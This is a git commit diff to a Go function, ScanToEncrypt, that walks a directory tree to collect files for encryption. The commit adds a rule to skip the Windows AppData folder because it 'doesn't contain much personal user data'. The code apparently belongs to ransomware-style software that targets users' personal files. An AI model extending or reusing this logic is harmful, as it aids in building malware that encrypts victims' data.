811b243357b8109c445650211b22446431552fdc
UpperCenter <tom@uppercenter.dev>
2021-01-14 15:19:09 +0000

    Added an exception for `AppData`

--- src/files/files.go
+++ src/files/files.go
@@ -40,6 +40,14 @@ func (f *Files) ScanToEncrypt() ([]string, error) {
 	err := filepath.Walk(f.rootDir, func(path string, info os.FileInfo, err error) error {
 		// Returns info describing a named file.
 		stat, error := os.Stat(path)
+		/*
+			The AppData folder contains a load of files that are difficult to
+			encrypt (because of permissions) and it doesn't contain much
+			personal user data, so we'll skip trying to encrypt it.
+		*/
+		if info.IsDir() && info.Name() == "AppData" {
+			return filepath.SkipDir
+		}
 		// If there's an error getting files, print the error.
 		if error != nil {
 			return error
